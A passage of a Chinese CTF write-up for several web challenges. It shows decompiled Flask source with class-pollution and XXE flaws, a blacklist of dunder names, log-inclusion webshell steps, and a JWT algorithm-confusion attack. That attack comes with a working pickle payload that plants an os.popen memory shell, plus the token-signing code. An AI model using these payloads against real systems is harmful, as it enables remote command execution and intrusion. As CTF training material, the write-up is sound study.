class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, flash, redirect, url_for, session, Response, send_file, jsonify</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;a123456&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;xml_data&#x27;</span>] = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;GeekChallenge2024&gt;&lt;EventName&gt;Geek Challenge&lt;/EventName&gt;&lt;Year&gt;2024&lt;/Year&gt;&lt;Description&gt;This is a challenge event for geeks in the year 2024.&lt;/Description&gt;&lt;/GeekChallenge2024&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>]:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">admin = User(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;123456j1rrynonono&#x27;</span>)</span><br><span class="line">Users = [</span><br><span class="line">    admin]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">isinstance</span>(v, <span class="built_in">dict</span>):</span><br><span class="line">                update(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">isinstance</span>(v, <span class="built_in">dict</span>):</span><br><span class="line">            update(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> Users:</span><br><span class="line">            <span class="keyword">if</span> u.username == username:</span><br><span class="line">                flash(<span class="string">&#x27;用户名已存在&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">        new_user = User(username, password)</span><br><span class="line">        Users.append(new_user)</span><br><span class="line">        flash(<span class="string">&#x27;注册成功！请登录&#x27;</span>, <span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">register = app.route(<span class="string">&#x27;/register&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(register)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> Users:</span><br><span class="line">            <span class="keyword">if</span> u.check(&#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: password &#125;):</span><br><span class="line">                session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">                flash(<span class="string">&#x27;登录成功&#x27;</span>, <span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">        flash(<span class="string">&#x27;用户名或密码错误&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">login = app.route(<span class="string">&#x27;/login&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(login)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/app/templates/play.html&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>, **(<span class="string">&#x27;encoding&#x27;</span>,)) <span class="keyword">as</span> file:</span><br><span class="line">            play_html = file.read()</span><br><span class="line">        <span class="keyword">return</span> play_html</span><br><span class="line">    <span class="literal">None</span>(<span class="string">&#x27;请先登录&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">play = app.route(<span class="string">&#x27;/play&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(play)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, session[<span class="string">&#x27;username&#x27;</span>], **(<span class="string">&#x27;username&#x27;</span>,))</span><br><span class="line">    <span class="literal">None</span>(<span class="string">&#x27;你没有权限访问&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">admin = app.route(<span class="string">&#x27;/admin&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(admin)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">downloads321</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&#x27;./source/app.pyc&#x27;</span>, <span class="literal">True</span>, **(<span class="string">&#x27;as_attachment&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">downloads321 = app.route(<span class="string">&#x27;/downloads321&#x27;</span>)(downloads321)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">index = app.route(<span class="string">&#x27;/&#x27;</span>)(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dashboard</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        is_admin = session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> is_admin:</span><br><span class="line">            user_tag = <span class="string">&#x27;Admin User&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            user_tag = <span class="string">&#x27;Normal User&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>, session[<span class="string">&#x27;username&#x27;</span>], user_tag, is_admin, **(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;tag&#x27;</span>, <span class="string">&#x27;is_admin&#x27;</span>))</span><br><span class="line">    <span class="literal">None</span>(<span class="string">&#x27;请先登录&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">dashboard = app.route(<span class="string">&#x27;/dashboard&#x27;</span>)(dashboard)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xml_parse</span>():</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        xml_bytes = app.config[<span class="string">&#x27;xml_data&#x27;</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        parser = etree.XMLParser(<span class="literal">True</span>, <span class="literal">True</span>, **(<span class="string">&#x27;load_dtd&#x27;</span>, <span class="string">&#x27;resolve_entities&#x27;</span>))</span><br><span class="line">        tree = etree.fromstring(xml_bytes, parser, **(<span class="string">&#x27;parser&#x27;</span>,))</span><br><span class="line">        result_xml = etree.tostring(tree, <span class="literal">True</span>, <span class="string">&#x27;utf-8&#x27;</span>, <span class="literal">True</span>, **(<span class="string">&#x27;pretty_print&#x27;</span>, <span class="string">&#x27;encoding&#x27;</span>, <span class="string">&#x27;xml_declaration&#x27;</span>))</span><br><span class="line">        <span class="keyword">return</span> Response(result_xml, <span class="string">&#x27;application/xml&#x27;</span>, **(<span class="string">&#x27;mimetype&#x27;</span>,))</span><br><span class="line">        <span class="keyword">except</span> etree.XMLSyntaxError:</span><br><span class="line">            e = <span class="literal">None</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line">                e = <span class="literal">None</span></span><br><span class="line">                <span class="keyword">del</span> e</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xml_parse = app.route(<span class="string">&#x27;/xml_parse&#x27;</span>)(xml_parse)</span><br><span class="line">black_list = [</span><br><span class="line">    <span class="string">&#x27;__class__&#x27;</span>.encode(),</span><br><span class="line">    <span class="string">&#x27;__init__&#x27;</span>.encode(),</span><br><span class="line">    <span class="string">&#x27;__globals__&#x27;</span>.encode()]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_route</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.data:</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                    <span class="keyword">return</span> (<span class="string">&#x27;NONONO, Bad Hacker&#x27;</span>, <span class="number">403</span>)</span><br><span class="line">                data = <span class="literal">None</span>.loads(request.data.decode())</span><br><span class="line">                <span class="built_in">print</span>(data)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">all</span>((<span class="keyword">lambda</span> <span class="number">.0</span>: <span class="keyword">pass</span>)(data.values())):</span><br><span class="line">                    update(data, User)</span><br><span class="line">                    <span class="keyword">return</span> (jsonify(&#123;</span><br><span class="line">                        <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;更新成功&#x27;</span> &#125;), <span class="number">200</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                e = <span class="literal">None</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">return</span> (<span class="string">f&#x27;&#x27;&#x27;Exception: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;&#x27;&#x27;</span>, <span class="number">500</span>)</span><br><span class="line">                    e = <span class="literal">None</span></span><br><span class="line">                    <span class="keyword">del</span> e</span><br><span class="line">                <span class="keyword">return</span> (<span class="string">&#x27;No data provided&#x27;</span>, <span class="number">400</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">update_route = app.route(<span class="string">&#x27;/update&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(update_route)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>, <span class="literal">False</span>, **(<span class="string">&#x27;host&#x27;</span>, <span class="string">&#x27;port&#x27;</span>, <span class="string">&#x27;debug&#x27;</span>))</span><br></pre></td></tr></table></figure><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-235612525.png" class=""><br>首先我们可以看到update_route路由是存在原型连污染的而/xml_parse会解析xml，xml的内容是config[‘xml_data’],那么我们只要污染其值就可以打xxe如下<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241104-112903200.png" class=""><br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241104-112914575.png" class="">  </p>
<h2 id="ez-include"><a href="#ez-include" class="headerlink" title="ez_include"></a>ez_include</h2><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241114-000155041.png" class="">  
<p>可以进行日志文件包含<br>直接UA头写马<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241114-001106105.png" class="">  </p>
<p>phpinfo里有flag</p>
<h2 id="jwt-pickle"><a href="#jwt-pickle" class="headerlink" title="jwt_pickle"></a>jwt_pickle</h2><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-194516698.png" class="">  
<p>正常的注册是会将账号密码存在user_list里的，但是登陆时除了admin其他的is_admin的值都为false。猜测要进行jwt伪造</p>
<p>先注册两个账号，使用jwt_forgery来生成公钥(这个方法还是在网鼎学的，不知道出题人是在网鼎前出的还是网鼎后出的)</p>
<img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241104-160839351.png" class="">  
<img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241104-161839147.png" class="">  
<img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241104-161858560.png" class="">  
<p>接着看源码</p>
<p>可以发现admin路由在RS256解密失败时会使用HS256解密，这时候我们只要将jwt使用HS256公钥作为key即可进行jwt伪造。<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-194330755.png" class="">  </p>
<p>而我们可以看到其提取jwt中的introduction来base64解密pickle反序列化，这里就存在pickle反序列化漏洞</p>
<p>我这里就直接打内存马了<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><br>然后对其进行HS256的jwt加密<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;D:\\工具\\CTF工具\\JWT\\rsa_sign2n-release(flask_cve_JWT_public)\\standalone\\ae677efb83731c6f_65537_pkcs1.pem&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">username</span>: <span class="string">&#x27;123&#x27;</span>,<span class="attr">password</span>: <span class="string">&quot;202cb962ac59075b964b07152d234b70&quot;</span>,  <span class="attr">is_admin</span>: <span class="literal">true</span> ,<span class="attr">introduction</span>:<span class="string">&quot;gASV4QAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIzFZ2xvYmFsIGV4Y19jbGFzcztnbG9iYWwgY29kZTtleGNfY2xhc3MsIGNvZGUgPSBhcHAuX2dldF9leGNfY2xhc3NfYW5kX2NvZGUoNDA0KTthcHAuZXJyb3JfaGFuZGxlcl9zcGVjW05vbmVdW2NvZGVdW2V4Y19jbGFzc10gPSBsYW1iZGEgYTpfX2ltcG9ydF9fKCdvcycpLnBvcGVuKHJlcXVlc3QuYXJncy5nZXQoJ2d4bmd4bmd4bicpKS5yZWFkKCmUhZRSlC4=&quot;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(token)</span><br></pre></td></tr></table></figure><br>主要username和password的值是要在user_list里的即是注册过的。</p>
<img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241104-161254709.png" class="">  
<img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241104-154811509.png" class="">  
<h2 id="ez-js"><a href="#ez-js" class="headerlink" title="ez_js"></a>ez_js</h2><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-231749364.png" class="">  
<p>根据hint可以猜出，其账号密码为Starven/123456<br><img src="/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/IMG_20241113-231841150.png" class=""><br>得到源码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; merge &#125; = <span class="built_in">require</span>(<span class="string">&#x27;./utils/common.js&#x27;</span>); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">handleLogin</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> geeker = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">geekerData</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">username</span> = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">password</span> = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">    </span><br><span class="line">        <span class="title function_">merge</span>(geeker, req.<span class="property">body</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(geeker.<span class="property">geekerData</span>.<span class="property">username</span> == <span class="string">&#x27;Starven&#x27;</span> &amp;&amp; geeker.<span class="property">geekerData</span>.<span class="property">password</span> == <span class="string">&#x27;123456&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(geeker.<span class="property">hasFlag</span>)&#123;</span><br><span class="line">                <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;direct.html&#x27;</span>);</span><br><span class="line">                res.<span class="title function_">sendFile</span>(filePath, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">                        res.<span class="title function_">status</span>(err.<span class="property">status</span>).<span class="title function_">end</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;error.html&#x27;</span>);</span><br><span class="line">                res.<span class="title function_">sendFile</span>(filePath, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">                        res.<span class="title function_">status</span>(err.<span class="property">status</span>).<span class="title function_">end</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;error2.html&#x27;</span>); </span><br><span class="line">            res.<span class="title function_">sendFile</span>(filePath, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">                    res.<span class="title function_">status</span>(err.<span class="property">status</span>).<span class="title function_">end</span>(); </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">object1, object2</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">            <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">                <span class="title function_">merge</span>(object1[key], object2[key]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                object1[key] = object2[key];</span><br><span class="line">            &#125;</span><br><span class="line">        